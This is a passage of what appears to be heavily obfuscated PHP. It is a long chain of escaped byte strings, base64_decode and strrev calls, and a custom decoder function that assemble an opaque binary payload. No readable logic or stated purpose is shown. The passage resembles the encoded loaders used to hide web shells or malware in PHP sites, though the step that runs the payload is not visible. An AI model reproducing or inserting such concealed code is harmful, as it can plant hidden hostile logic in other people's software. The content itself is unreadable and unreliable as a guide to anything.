34\212\42\102\350\4\105\362\303\51\36\26\226\55\160\6\77\363\121\104\34\371\50\302\17\33\134\112\262\322\207\277\37\157\343\141\101\14\243\110\107\234\251\333\140\354\273"."\xac\x91\x87\x5b\xb8\x32\x3a\xce\x88\xc6\xa4\x48\x20\x16\x68\x8d\xf3\x68\x6c\x19\x57\xdf\xe1\x69\x54\x8d\x47\x6d\xeb\x68\x15\x18\x3f\x12\x58\x8a\x80\x25\x2a\x8\x14\x86\xad\xab\x7c\xd3\x16\x57\x77\x51\x1d\x49\x1a"."\244\77\247\261\30\326\33\353\136\135\353\121\346\254\255\206\62\334\234\211\335\147\344\30\311\211\277\162\106\104\215\104\233\151\234\130\17\14\345\122\342\356\242\164\52\210\376\115\10\372\327\142\107"."\27\337\15\12\202\141\205\252\127\53\155\321\145\1\141\220\116\312\200\24\141\237\316\177\126\147\327\160\227\17\21\13\326\112\241\363\330\330\240\60\62\204\30\266\201\153\36\324\16\260\143\164\245"."\x7\x4e\xc\x35\x63\xf6\x32\x93\x53\x8\x21\x32\x72\x81\xfe\x2e\x67\x1\x82\x2b\xa1\x42\x92\xa8\xce\x8f\xf0\x4e\x4\xbc\x67\xaa\x5d\x6b\xba\x4e\xed\xf2\xfa\xa8\xa2\x29\x26\x5e\xba\x3c\xa2\x4b\x6a\x68\x39\x3a\x63"."\xe3\x71\x87\x96\xac\x9a\xc5\x9a\xf7\xd0\x3a\x1a\x25\x84\xe8\xae\xa5\x91\x85\xf0\x3\xb7\xb3\x85\x70\x3d\x80\xe8\xa2\x7a\xbe\x98\xa1\x33\xd6\xb4\xa1\xbf\xcd\x89\x35\x21\xf4\x37\x82\x7e\x22\x9\xb4\x5c\x6\x2f\x80"."\xb6\x64\x24\xbc\x24\xb4\x6\xff\x23\x32\xaa\xf9\x44\x52\x2d\x32\x67\x85\x70\xdb\x1a\xf4\x2f\x42\x30\x6b\xc2\x6d\xee\xc6\x1a\x42\x89\x65\xa1\x10\x2d\xc0\xc2\xf0\x2b\x8a\x22\x84\x3\x43\x95\xac\x4b\x62\xc5\x9\xc8"."\x16\x8a\x14\xd0\xb4\xaa\x56\x91\xc9\xf4\x76\x4f\xaf\x56\x55\xbf\xd5\x1\xf0\xc2\x8d\xb2\x54\x55\x4e\xa9\xad\x84\x33\x24\x10\xf\xa\xec\xeb\x0\x88\x52\x58\x20\x6a\xe\x4e\x40\xe0\x36\x13\x21\xde\x1c\x8b\x76\xb4"."\113\361\226\300\322\160\133\63\213\371\231\72\200\62\15\232\126\32\303\161\64\105\101\6\214\302\224\243\34\7\202\223\220\105\62\325\353\0\351\106\204\331\121\104\42\331\361\145\200\142\146\347\56".strrev('íğE”„Y#&!.™°èE€æB,nag)à‹'."\0".'ÄâÇ:Ê™LáÕ‚\\õeGèk')."\x24\xd4\xc6\xf2\xd0\x55\x11\x5d\xf3\xd8\xfd\xaf\x4f\x1b\xe2\x9a\xad\xb\x52\x3d\x92\xc5\x16\x8c\x83\x7d\x94\xcd\x87\x4d\xfa\xa0\xeb\x9b\xc6\x99\xbb\x2e\xce\x2c\xe1\x66\x49\xf7\x7f\x2a\xa0\xa8\x48\x6a\xf4\x98\xc5"._kodDe('LmEb7JD0pC4SCTnL5GKlESFHfigiOpVmzaCyfiNyfxe6WOpYiDrMVY8XipN0ipnzAoyOYsty')."\140\136\121\156\75\260\237\5\347\7\313\151\22\306\64\215\72\157\124\34\115\255\344\27\45\60\341\341\201\137\350\321\341\364\247\13\242\214\225\321\5\37\251\364\300\241\333\305\10\366\316\256\221"."\232\32\57\372\147\36\372\333\200\376\6\321\337\20\116\150\352\32\231\333\204\2\363\233\272\375\360\260\332\325\125\61\321\164\102\1\66\251\20\255\240\121\126\313\340\147\144\262\17\233\14\122\355".strrev('¬í_h *U¸0tª«Ë´MŞ±‚Å J7ÒT¡ µ'."\n".'MÂQb”í¢Æ7ˆ¿S¦àœË“üã,').strrev('p=™TÁ…±¤%¢	ÕøıÙ‡3êÓíá_h±-%)'."\r".'eŞĞVT*iªˆÔ*W-kn')."\x89\xe7\x39\x94\x82\xa6\x59\xe1\x38\x3a\xe0\x23\x11\x32\x52\x94\x65\x58\x98\xf0\xf5\x28\xdc\x64\x5\x4e\xc4\x97\x15\xca\x4e\x85\x86\x58\x6\x6d\x88\x66\x85\x96\x27\x62\x1\x9c\x48\xa8\xd5\xc3\x26\xa1\x3f\x4\x1"."\xe1\xdb\x54\x21\xab\x51\xf5\x59\x42\xe3\xf9\x56\x2\x53\x61\xa5\x83\xa4\xa4\xc4\x26\x26\x2a\x1\xc2\xc8\x11\x29\x8d\x89\xe7\x10\xce\x2\x9d\x66\x99\xef\xb0\x4\xa8\x74\x1a\x6b\x8f\x85\x5b\x3\xb1\x15\x30\x65\xe2".strrev('€X{c©Š¥ÓÈÕÊ°"ÁWX47¨ÈÃ/û£#Æº²×¨m‹$:°ÄE¼´8ÌÔ['."\0".'Î')."\x99\xef\x20\x8a\x64\x8c\xc1\x95\x45\x28\x8a\xc7\xc4\xaa\x1\xec\xc3\xaa\xc8\xb9\xb2\x2a\x9c\x30\x59\x8c\xf\x55\xbc\xc8\xec\x74\x68\xa\x74\x44\xe4\x14\x98\x2a\x65\x49\x68\xc5\x17\xec\x11\xd6\xd3\x72\x7b\x84\xe5"."\x31\xf6\x8d\x78\xcb\xe2\x73\x1\x23\xab\x9a\xd\x23\xa5\x96\x46\xaa\x66\xa0\xdb\x6c\x31\x87\x4d\xeb\x30\xa6\xa2\x50\x7a\x1f\xc2\x4a\xdc\x5a\xa1\x6a\xc6\x6c\x56\x89\xf5\x1d\x4e\xec\x8e\x44\x54\x45\xa7\x52\x2c\x84".base64_decode('z4iSsUh3eHnBoDIuwG1Df8GwWZlyw+b1ORcr1NYcbgvVY4V6RCuw7gKfDttKnQfthKNqBNE=')."\327\252\314\212\13\107\201\157\354\60\304\251\252\302\142\215\117\23\202\357\166\241\50\331\61\64\114\42\144\336\312\365\121\210\124\74\2\226\200\260\141\301\171\333\44\257\330\203\153\313\107\37\324"."\x77\xd9\xbb\x35\xcc\x3a\x9c\x83\xb\x53\x8a\x67\x81\x28\xae\x3a\x3e\xee\x96\x2a\x97\x93\x85\xc0\xbb\x78\xf1\x66\xf\xec\xdc\xe\x22\x54\xe8\x90\x6c\x50\x90\x7\x1a\xf6\x41\xf2\x82\x94\x73\x77\xf\x2b\x9f\xb7\x32"."\xb3\x40\xe8\xec\xcd\x30\xbb\x69\xaa\x2e\x6\x97\xd5\x2d\x8b\x3f\x84\x27\xfa\x74\xc5\xca\xeb\x49\x62\x6f\x55\x1\xb3\x80\x4a\xca\x94\xdf\xf8\x60\x29\xc8\x15\x8c\x5\xed\x3e\x61\xbc\x43\x36\x54\xdc\xd8\x0\x4b\xe5"."\324\315\316\142\145\300\270\236\1\216\177\143\17\321\73\20\312\205\102\165\113\322\107\40\55\210\165\245\346\27\135\25\241\245\60\237\70\251\224\110\214\10\103\305\370\11\105\264\331\315\370\12\142"."\172\126\31\354\370\164\277\216\362\116\346\314\166\376\320\271\114\74\13\301\11\205\32\160\76\233\362\172\362\42\340\327\312\222\222\330\146\311\27\255\60\263\370\105\172\46\151\226\342\50\103\31\131"."\x87\xe6\x5a\x31\x87\x3e\xe2\x95\xd5\xb8\x10\x64\x91\x44\x49\x71\x84\xd9\xaa\xa4\xb1\xb9\x20\xcc\x82\xa0\x17\x2\xbd\x90\xc2\x7e\xb\x2c\xc7\x27\x6c\x1c\x91\x36\x31\xe5\xe5\x15\x96\x46\x52\x9a\xac\x6c\x2b\x59\xfb"."\237\54\3\16\131\162\1\371\151\103\66\73\342\23\266\236\371\146\72\215\57\24\326\121\367\62\200\103\320\245\112\175\151\347\345\205\225\127\72\33\322\62\220\4\32\44\333\137\251\23\235\150\61"."\360\166\30\225\140\107\112\345\273\14\54\115\107\314\136\216\271\20\161\13\206\330\34\330\53\34\205\272\76\35\253\221\121\245\236\20\267\314\211\52\122\373\171\137\136\251\103\62\266\75\1\302\51".base64_decode('Wy8IBfkHC4Qx9eUfjOmCXkDViNbel1YSCJh8iVSSkLarDgFHqmEEK98H2QLG0EnRFlVb0GE=').strrev('P:‹ÊlŠÏèFA7-€Ã‰ˆy×„jö,){èä@\\¹pÓê\'é+j#bÕŸÈ%aŒäe')."\x97\xd2\x6d\x6e\x5d\x8b\xe8\xa3\x4a\xb6\xbf\x24\xe5\xf3\x2c\xc7\xb7\xc3\x92\x39\x5d\x6d\x48\xc7\x4a\x7a\x8c\x75\x53\x22\x70\x4\x43\x29\x1d\x1c\x74\x11\xbf\xad\xc5\xa3\x1d\x31\xf6\xe\x84\xe3\x98\xff\xa5\xc6\x42"."\xc1\x15\xfc\x49\x86\xa7\x36\x5\x96\xba\x53\xc2\x98\x7f\x19\x68\x2e\x9b\xcc\xb9\x6a\x38\x9d\x5c\x5f\xd5\x58\x14\xb3\x1f\x43\x91\x26\x57\x85\x78\xb\xb7\xcc\xec\x4c\x53\x23\xe1\xb6\x25\x65\x33\x10\xb9\xd2\x2a\x55"."\xa1\x89\xe1\x44\xa8\xd5\x9d\xe6\x6c\x21\x1e\xa\xc4\x98\xd9\x70\x1c\x6f\x88\x44\x83\x52\x76\x38\x5a\x3a\x13\x9c\x1e\xe2\x89\x94\x79\x49\x13\xfd\x67\x55\x75\xad\x26\xf7\xa9\x3a\x74\xad\x4a\xad\xc1\x5c\xe\xaf\xda".base64_decode('Pb16cdfa6qou/2LfNM6co+hKUnKeINlih0+dOwGfWyyRVoOY3+eDj/CAv8vPTLj5RSb8ivI=')."\247\270\316\30\60\323\37\247\366\260\34\35\165\331\142\141\326\15\174\156\115\72\225\251\317\61\314\252\245\231\124\102\230\76\361\252\361\25\161\276\126\316\64\7\104\122\230\226\205\63\134\205\321".base64_decode('33a5KBZQKlvQAdIO5XI5yWeYYreIbZ0yk0VsgUuskVBFR0k+uQl5AxomUBNMM5joysPWx9w=').base64_decode('CAi6dfPFyUyjjY4+ohNjQLAo4Ktxhh5y6DCG0z6IiObmlvDpSyKtbdH2M2LxRMfSZctXgNk=')."\326\72\6\225\151\305\313\30\62\140\7\331\217\256\13\376\41\346\3\142\51\276\17\351\226\137\246\45\171\42\232\104\154\300\232\131\335\243\174\24\236\213\321\223\277\174\26\155\315\237\315\331\265"."\23\224\150\57\350\75\246\151\117\220\273\264\365\213\33\206\314\316\56\253\233\157\203\224\76\304\6\255\203\60\254\220\45\264\304\165\20\310\31\257\354\224\2\357\13\231\120\115\365\270\350\16\110"."\20\106\257\44\352\104\44\162\133\346\64\72\252\13\221\115\163\130\262\5\316\266\47\252\16\64\33\330\46\156\306\246\170\231\351\335\101\142\111\325\155\206\165\320\313\164\23\40\137\330\7\37\364"."\242\13\264\43\356\62\305\172\52\71\153\132\315\336\302\14\277\215\373\231\103\347\23\364\5\50\26\171\73\222\63\213\313\61\341\223\261\305\205\14\170\42\267\212\22\47\222\252\165\312\54\160\362"."\xd0\x84\x68\xfb\x94\xd2\x49\xc9\x75\x78\x7e\xc0\xa4\x1e\xf1\x53\x40\xa3\x1e\x45\xd8\x4f\x67\x8c\x63\xa7\x61\x74\xb6\x1f\xf1\xae\x92\x74\x92\x93\xb2\x4d\xc\x86\xdd\xb3\x3\x42\x74\x2e\x3b\xc0\x65\x56\x92\xe\xea"."\x6\x13\x12\x4d\x92\x84\x9d\x20\x60\xc0\x13\xb\xca\x6b\x18\x65\x5b\x13\x34\x7d\x1b\x46\x63\x92\x8f\x29\x87\x3d\x12\xd9\x77\x8d\x96\xcf\x7\xfb\xf0\x18\x1c\x7b\xd8\x91\x94\x94\x23\x69\x2c\x69\x23\xcb\xeb\x38\xad"."\263\243\354\106\112\105\246\170\171\113\204\270\271\365\264\144\210\275\244\5\104\161\346\102\314\250\101\111\56\42\117\15\221\375\305\175\151\45\323\313\13\73\204\42\123\354\154\262\330\246\74\165\304"."\x6b\x5a\x96\x37\x5f\x30\xb1\xc4\x5e\xbd\x91\xed\xf5\x5b\xc3\x90\x97\xd1\x2c\x7b\xa9\xc3\x8c\xd4\x97\x5a\x60\xc7\xe6\x50\x5a\x39\xbd\xe\x5d\x18\xf1\x12\xa8\x66\x1f\x81\xaa\x38\xc9\x5f\x20\x12\x4d\x9e\x61\x38\x9f"."\74\304\376\252\132\303\0\306\217\372\346\307\246\72\11\141\315\5\355\242\161\366\126\345\34\75\25\151\222\30\1\140\43\260\231\111\26\161\143\347\302\266\65\175\142\240\141\141\23\32\335\17\2"."\275\330\72\214\231\143\36\226\250\357\13\331\62\176\112\47\335\345\106\15\44\243\362\330\377\12\332\352\114\26\121\62\57\217\50\316\136\276\214\304\332\263\154\301\23\117\271\67\353\160\273\102\27"."\xc8\x69\xb4\xdd\xd2\xf5\x1\x26\x3b\x89\x57\x5b\x60\x94\x2\xb7\xad\x4f\x5f\x9e\xbd\x65\x13\xbc\x92\x34\x24\xdd\x4f\x92\x3b\xe\xfc\x39\xe0\x3b\xf4\x51\x47\x1f\xd0\x5f\xfa\x73\x66\xb9\xde\x7b\xb\xc2\xdc\x3d\x5a"."\35\352\66\144\211\76\312\314\222\177\261\145\363\256\346\256\326\256\204\74\134\273\240\245\323\250\263\222\75\136\276\210\302\276\75\100\22\161\237\303\206\77\261\165\174\170\122\211\321\241\5\361\355"."\x6d\x4\xbb\x2f\x11\xb6\x5f\x3b\x62\x11\xc7\x53\x18\x14\x65\x83\x58\xd5\xe7\xd\x32\x59\x33\xb3\x98\x49\x91\x1b\x31\xfa\xa2\x99\x19\xd2\x15\xf1\x28\x3e\x7e\xd5\xb6\xf1\xfb\xae\xd8\xb7\xfb\x86\xf1\x8b\x6f\xdb\xb3"."\353\241\361\255\17\322\164\72\51\215\172\216\57\355\370\205\337\333\373\320\365\373\166\354\176\353\252\35\357\75\174\321\276\235\77\306\102\117\67\336\106\145\240\306\266\254\33\277\342\236\261\55\233"."\366\375\350\374\361\7\57\31\277\376\73\157\135\163\311\137\316\135\7\233\43\107\214\320\6\12\275\105\61\25\264\312\370\266\207\307\36\336\362\326\345\327\354\333\271\123\52\157\143\221\274\214\264"."\73\320\102\215\155\130\377\326\167\356\30\333\162\351\336\313\157\54\251\100\77\340\136\112\74\274\53\276\273\367\332\363\245\34\167\245\6\142\223\137\260\1\170\35\232\61\166\311\346\275\267\337\343".base64_decode('rkSdNJSpNH7lxj0PPeCq1GbGi8m+Bsn4//hFG8d2XMs/smfXZirE76rChfB4edp+afk4A9o=').base64_decode('RlO30FHZqtlJ2Kd7tz+K+kNnTF65sZ0b9m47b+/2C2Alrt45dsn3x7ffsvemHbxZgCqHdDA=')."\156\340\207\353\366\75\260\176\374\252\7\170\101\274\253\123\212\50\103\40\212\226\301\12\13\344\203\173\37\271\164\357\103\133\61\220\154\132\267\167\335\117\306\266\336\63\166\375\271\374\263\143\273"."\166\211\131\216\372\211\223\271\62\370\364\14\234\16\30\65\55\104\114\363\105\311\317\241\214\303\60\325\305\245\110\61\243\213\372\323\140\304\24\161\175\1\136\232\352\331\276\104\363\230\153\60\123"."\x30\xf7\xab\x2b\x10\x76\xac\xa8\xab\x98\x52\x85\x7e\xab\x2b\x3c\x15\xf8\x12\x43\xe2\x18\x3f\xe2\x4\xd2\x8f\x8a\xba\x29\x55\x24\x50\xd\x36\xa8\x56\xc1\xd1\x20\x19\xd2\x16\x1b\xf\x98\xc3\x8b\x11\x82\x90\x9e\x50"."\27\223\223\6\237\143\63\374\63\374\354\154\133\74\210\277\50\174\253\165\360\43\105\220\174\364\160\241\136\160\330\73\153\233\156\17\233\5\131\316\172\106\15\150\234\365\111\107\103\326\2\44\117".strrev('ò‘ïÒêô»rÕ\'1Ä¬'."\n".'bÊs)eİÛUÖ÷ßÖÇ{ãş(ìÉ*…AĞ)sd¼j•€ŞS½')."\xce\xaf\xb1\xc2\x63\xe7\x6d\xdd\x7b\xb9\xab\x24\x13\xe5\x55\x24\x2e\x9c\xa8\x40\xa0\xdf\x85\x47\x38\xea\x97\xab\x50\x78\xff\x3f\xd9\x45\x94\x27\x5a\x87\xdf\xe\x68\xc2\x72\x6f\x47\x7e\xb4\x98\xf3\x62\x2e\x99\x37"."\x2e\x5b\x2f\x75\xf9\x97\xaa\x71\x96\xc7\x7c\x2e\x67\x79\x99\x24\x48\x8a\xa3\x35\x2b\x82\xd4\xef\x55\x9d\x22\x7b\xa5\x93\xec\xc5\x13\x1e\x2a\x3d\xbb\x98\x70\x15\xa4\x61\x6a\x81\x25\x19\x4e\xc9\x6e\x41\x0\xa8\x4e"."\x2\xe0\x34\x57\x7f\xb1\x70\x8c\x17\x51\xf1\x78\x8f\xa1\x8d\x6b\x1b\x92\xc3\x7\xb9\x88\xd3\xcd\x99\xdb\xf9\x99\x7b\x16\x48\x15\xcc\x74\xf5\xca\x8e\xd7\x46\xd0\x25\xc\x67\x63\x27\x39\x5e\xcc\xc2\xf5\x1a\xa9\x89"."\x72\x4\xe2\x28\xdb\xd5\x24\xb8\xd5\x28\x57\xa4\xa3\x68\xa4\xdc\x9f\x24\x42\x40\xde\x62\x91\x7d\xb0\x6c\xa3\xf2\x15\x91\x15\x20\x83\x8\xf3\xf6\x1c\xfe\x61\x34\xb4\xd6\xfc\xd\xd3\xed\x7e\x46\xdc\xaf\xb5\x52\xef"."\50\53\262\51\145\306\314\272\331\363\353\230\142\356\251\114\206\251\230\147\352\11\50\310\274\247\114\366\247\31\256\21\156\313\330\330\360\202\113\76\175\34\311\142\32\271\257\24\206\244\34\345\104"."\x6f\x1d\x4e\xf7\x60\xa0\x94\x7f\x24\x39\x21\x22\xcf\x49\x14\x45\x61\xc9\x3e\x95\x3b\x6b\x2a\x83\xad\xd\xe6\x88\x4b\xb2\x21\xcd\xd7\xa1\x97\x5\xa\xfc\x16\xaf\x89\x9d\xd1\x93\x19\x10\x3\x20\x68\x5\x0\x7b\x0"."\365\317\24\167\41\102\205\112\10\41\331\127\314\15\324\113\231\212\155\232\112\126\313\215\302\25\163\252\125\67\325\132\200\77\124\217\125\117\254\251\314\123\27\76\230\204\101\126\152\364\13\162\350"."\113\231\17\273\335\363\341\123\57\126\204\122\355\4\247\303\51\107\275\234\101\106\244\243\71\334\46\111\33\112\11\152\260\261\115\15\264\267\227\315\200\151\247\14\153\54\252\343\353\227\174\256\322"."\xd0\x42\x74\xbb\x52\x92\x58\xb9\xa9\xbe\x2\xa7\x56\x28\x56\x21\xc9\xcc\xaa\x57\xf8\x41\x78\x8d\x14\x10\x54\xd0\x42\x3\xaa\x54\xe2\x2a\x4a\x1a\xc1\x84\x97\x84\x68\x76\xe5\xa2\x85\x7e\x3\x6a\xfa\xfc\xa7\x60\x1c".base64_decode('7cdie7lT8dLJUkQktUnYTVOUhZpCp6u+kjy/VCp96BznMsuL3JW5n7yFfk3OxLslZrIrIL8=').strrev('Ú¼‘~BÈ“ôƒñEù…Ş7®ØGÚhsr’ûÁV––å¨*¨â×’Ş_e£qv')."\x44\x3\xad\xf4\x63\x7e\xc2\x2d\xf2\xb\xf6\x84\x4a\x5d\xcf\x96\x7f\xe6\xe4\xaf\x7b\x65\xe0\x8\xb\xf1\x20\xe0\x67\xd2\x13\x5a\x72\x0\x3\xa2\x38\x22\xa0\x1b\x90\xd1\x8e\x99\xd\x34\xc3\xe1\x83\xc6\x96\xe4\xae".base64_decode('ilhjlLwVFYQLv9WraUPYv9LataVpIMntzgrkDXcSBjh3Gmb6iDR01jk/Q4FdLiRSWBn6K+o=')."\104\332\232\105\204\136\327\35\231\235\114\6\213\304\272\72\53\175\323\326\256\365\33\114\336\221\311\132\261\272\76\136\232\306\273\174\316\362\150\44\60\365\274\40\44\270\113\122\240\72\35\240\350"."\x30\xff\x34\xa1\x7e\xca\xe5\x1a\x15\x2c\xec\x58\x5f\xbf\xa8\x93\x93\x57\xdd\x2c\x4f\x25\xbc\x12\x79\xed\x18\x79\x6a\xd4\xce\x63\x40\x81\xee\x8f\x89\x65\x3c\x18\x6c\x13\x4\x38\x9d\x38\xd7\x96\xa2\x48\xca\x47\x38"."\170\1\247\111\365\305\302\343\241\134\225\206\3\171\107\253\214\223\111\36\321\62\106\217\237\243\20\372\260\346\113\12\115\115\126\204\40\60\127\72\26\131\164\145\140\37\5\44\171\10\141\130\263"."\xc0\x51\x1e\x4f\x47\x6d\xf1\x44\x0\x79\x8c\x96\x24\x2c\xc4\xb3\x17\x5a\xc9\x82\x91\xb7\x1d\x28\x91\xfa\xf2\xae\x20\xce\xf1\xfa\xb5\x21\x8d\x16\xa9\x50\x80\x3b\x57\x5f\x41\x1c\x9e\x54\xa0\xed\x4d\x73\x18\x1e\xe4".strrev('Ñg)æsÁ´'."\n".'‘P1¤×üW*DÛ>5g(V*‚>åsA>¨ë§Õ„}Lãè†¿ˆ\\')."\337\51\247\60\250\42\176\123\63\210\160\46\12\40\4\345\21\352\74\215\271\256\264\20\270\110\155\217\105\23\321\40\363\53\350\144\317\322\264\131\354\246\141\121\235\127\161\71\143\372\173\134\356"."\x89\x95\xe0\x24\x86\x1f\x52\x0\x1a\xa\xc5\x5c\x8e\x8b\x9c\x62\xd8\xe5\x47\x63\x7d\xf9\x3f\x9d\xe4\xc5\x55\x4f\x75\x4f\x90\xaf\x74\x6a\xec\x3d\x16\x78\xc8\xf4\x81\x99\x69\xac\x42\x3f\xd1\x21\x9c\xc0\x86\x6\x2c".base64_decode('SJYssmJ7sHrK10ktKdTXMCUuJuAqlD1ZSTlHwadKN591hAv8gErFLqvET4jg8qvSU1nlm1Y=')."\135\131\232\103\105\211\235\371\130\116\117\75\75\216\62\301\301\26\120\7\104\113\62\30\11\207\332\22\152\30\10\203\332\31\163\175\65\102\203\321\260\204\205\143\32\16\162\41\250\202\116\146\325"."\xe7\x18\x56\x99\xa9\xa1\x4f\x2c\x9\x2e\x8\xab\xe7\x1c\x1c\x57\x3a\xa5\x19\x93\xd9\xde\x9d\x51\x53\x53\xe3\xad\xa9\x45\xff\x33\xcd\xe\x66\xf1\xb3\x8e\x99\x99\x91\x8a\xd4\xd4\xd4\x91\xff\x69\x6\x79\xe6\x0\x10"."\164\346\40\364\310\360\72\24\30\326\231\105\24\70\107\321\165\271\310\210\322\316\40\326\115\125\160\327\140\131\204\40\57\202\76\142\22\227\241\130\207\327\126\205\310\23\100\114\27\223\220\225\74"."\215\306\301\204\162\257\3\332\331\153\0\65\227\316\216\120\324\251\136\62\101\320\167\256\4\215\212\211\35\264\200\252\246\327\363\16\206\162\251\116\371\143\76\66\321\64\121\170\22\360\262\14\257".base64_decode('7HEIKlGkJ54LHV1DdZx2d3EKIpCSfMw4QeLMYupXsiWMo/KrIMnmmsQkluE2XHC0jbdEHVs=')."\x51\x8f\x31\x30\x87\x65\x76\x64\x9f\x39\xac\xa\x9a\x5\x47\x4f\xe7\x31\x32\xa5\xf8\xfa\xc9\x40\x32\x25\x69\x7b\xe3\x79\x65\xe7\x93\x54\x9c\x8b\xce\x9\xc9\x22\x20\xe6\x88\xf5\x91\x1\x23\xe3\x30\x8e\xa0\x4a\x55"."\xe5\xb9\x5d\x80\xb\xb2\x91\x24\x9c\x35\xb1\x87\x6d\xdc\x51\x2f\xee\x77\x9d\x98\x45\x84\xdf\x2\xdc\xe5\x17\x95\xb4\x66\xfd\x55\x0\xe3\xd0\x28\x71\x26\x40\x5d\x4b\x13\x26\x4f\xdd\x61\x25\xb\x6e\xbb\x17\x9b\xac".base64_decode('m+Nxwy3DyGLS6rH3rviXiBmylBBLoC91QW6IV2rAneWqE6DPZCUVIL20NHlNLFMap7tKE5M=')."\273\101\156\131\134\266\303\113\371\123\222\300\232\5\356\125\204\264\20\153\143\110\272\255\372\362\5\263\27\101\202\45\117\32\112\157\57\237\314\213\227\226\54\123\210\367\136\56\47\47\342\167\113"."\346\263\36\100\113\30\124\320\122\374\360\224\212\12\37\117\122\242\163\207\113\31\101\356\231\117\116\304\327\140\131\76\214\334\100\234\155\340\373\265\63\205\367\354\13\200\216\261\103\354\202\226\263".strrev('qÛ0ˆ…M’='."\0".'w@OF_A81ã…†Q¦3‡à„†xhâeX0˜UR¾ÉUf°&+À²Ò').strrev(' n:ç"¨¶è€2¦0Ûbİá%æUR³ò´ÿr´ğ¥c.”¸noyœÕÈ«F:Ó'."\0".'zÙ‡')."\xa3\x25\x29\x86\x5b\x67\x2f\x9e\xe8\x2\xe\x86\x6b\x3c\x38\x59\xa1\xbe\xdf\x15\xec\xe0\x7e\xb2\x73\x7d\x4a\x2b\x80\x7f\x3c\x13\x51\x97\xd8\xaa\xb7\x5c\x9\xb7\xd5\xe1\x42\x51\x4b\x38\x96\xc4\x31\xde\x57\x4a\xda".strrev('yÅ4[¡Ç„>Í´Ru*Àìq%wFícGàìZÓ'."\n".'@‡ßó~²(geNùˆoªeZQ1').strrev('H»ÅZ	Å"6s¤¤›~üÚc*Ç{7ûØ¹2’³ˆï¤+ufDç„7"Š‡K').base64_decode('dNUhXSC5XOBFUTdY5zXWNyKvSlxbSFd+V9Qt3YtrSGQQikpHNCEQbHbGM8cWQiqWBAVWfvM=')."\xea\xd\x2c\xb0\x5e\x0\x57\x5c\x12\xa6\x2c\xd3\x3f\x68\x95\xb7\x89\x7b\x90\x13\x42\xb9\x40\xe9\x14\xf4\xa4\x59\x48\xe1\x53\x52\xb2\xdc\x93\xb3\x63\x7a\xaf\x1c\x25\x82\xc\x6c\x8b\x8\xa3\xf8\x72\x13\xd8\xd0\x9b"."\204\213\360\326\14\44\355\242\154\66\116\362\233\201\142\222\370\226\104\275\172\153\25\116\366\252\264\145\32\231\56\145\220\362\345\50\140\27\253\127\122\303\43\234\260\170\261\207\277\113\273\150\121"."\xa6\xd9\xa7\xc8\xa4\x1e\x53\xd5\xc3\xd\x10\xc3\x59\x78\x4\x96\x9c\x87\x9a\xc5\xf6\xea\xc5\xc8\xe4\x2a\xe4\x9b\x25\x55\x68\x1e\xa6\xb6\x84\x4e\x9f\x9c\x63\x61\xf\x29\x1d\x6c\x15\xcb\xe5\x94\xf9\x14\xc9\x92\x66"."\64\311\311\157\230\35\61\111\220\61\252\63\161\162\157\355\14\57\63\5\52\353\371\261\33\35\34\56\150\143\111\140\200\357\304\14\267\201\60\66\224\23\145\114\351\205\237\330\227\22\346\162\210".strrev('2¿Ú†tEàùœ?´W{‰ÙÂÓåÊ:Æß•ğ…ëŒ”øÄÚ‚çC$úÄ¾-Q')."\x12\x90\xae\x46\xc0\x55\x8f\xec\xe4\x85\xd4\x12\xe3\x10\x6a\x9\x28\xc9\xa4\x8e\x56\xa4\x89\x11\x42\x58\xd4\x2c\x17\xd3\xbb\xe0\x48\x4e\x24\x27\x4c\x9e\x58\x2a\xc8\x85\xa1\x12\x9a\xa4\x6\x11\xe0\x9a\x5c\x55\x8d"."\xd\x22\x38\xd8\x95\xad\xa3\x5c\x6d\x1d\xb\x49\xe2\x93\x9b\xcb\xd9\x5b\x72\x84\xe5\x72\xe0\xb4\x1c\x11\x2a\x75\xea\xa8\xcd\x93\x78\xa9\x61\x9d\xd9\x36\x60\xd7\xfb\xf6\x96\x76\x3f\x4f\x6a\xe0\xdb\x93\x72\x57\x84"."\171\302\40\223\274\324\107\164\270\11\16\147\215\244\22\211\66\207\203\201\110\143\70\276\104\351\305\117\266\102\40\21\165\127\45\333\126\265\204\327\41\272\153\10\173\232\256\0\3\357\36\356\274"."\x7\x7\xbd\x3d\xe8\x3e\xe1\x4d\xf1\x7b\x98\x25\x6e\x5c\x64\x50\xd0\x98\x70\x9e\xe8\x6c\x96\x2\xa2\x5e\x28\x69\x31\x87\x75\x11\x33\x25\x75\x30\xd3\xbd\x4c\xe9\x8c\xe0\x19\x4b\x85\xf3\x5\xbd\xb4\xfc\xa8\x8e\x65".base64_decode('IaUeSxWKZXoD5ct/gXhekksjMknPTdR5IzdkWIbAAKzGqNx6oLE13KYGIpHoMoewsnhuKHA=')."\206\113\112\166\234\45\255\214\130\4\372\165\331\356\245\234\342\360\54\342\142\302\320\345\223\215\262\346\331\313\30\370\44\346\336\160\150\124\162\154\227\57\150\206\245\113\11\324\7\133\55\250\367"."\x69\x99\x8c\xc3\xbf\x6e\x26\x2d\x45\x8b\xce\x23\xb6\xec\xa7\x54\xfa\x1\x96\x46\x8\xde\x89\xb\xc4\xc2\xcd\x2d\x89\xff\x75\x57\x8d\x94\x30\x55\x68\xa4\x98\x14\x1a\x57\xe5\xa6\x8e\x72\x82\xb2\x57\x66\xf6\x4d\xe1"."\216\251\64\345\177\353\30\320\43\136\27\125\142\255\215\171\46\65\311\365\11\150\173\232\26\216\252\324\61\256\370\4\42\134\12\243\171\371\125\327\237\202\26\260\61\331\20\323\126\302\21\161\177"."\301\245\240\21\374\25\172\253\105\227\165\314\170\144\67\35\306\304\103\230\3\46\334\41\171\351\362\154\350\226\331\167\370\55\54\371\6\361\205\103\363\72\361\50\120\311\156\61\46\24\343\22\356"."\xa2\xaa\x3b\xa7\x4c\x7\x50\xb6\x22\xd8\x61\xbc\x80\x52\xaf\xd4\x50\x1f\x9c\xdc\xaf\x91\xb2\x90\x19\xac\x10\x1f\x20\x66\x13\x43\xd9\xbc\xed\xb8\xf1\xb7\xc8\xfa\x3b\xd2\x92\xd0\x4\xcc\x1b\x2a\x70\x46\x1f\x5d\x73"."\26\305\13\313\336\237\115\125\76\56\11\352\25\367\100\54\224\151\146\107\113\22\34\234\263\10\33\15\27\217\306\276\240\162\151\123\236\165\42\336\217\125\270\250\153\135\312\220\360\240\53\210\156"."\x97\x3a\xe3\xa3\xd5\xff\xff\x54\xa4\x99\x71\xc9\x32\xb0\xb3\x91\xd2\xe\x59\xee\x23\x93\x1f\x77\xe\x4d\x4\xe2\x74\xb0\xcf\x1c\x76\x3a\xdf\xc5\x29\x12\xe5\xc6\xb4\x1f\xa4\xfa\xd2\x7e\x23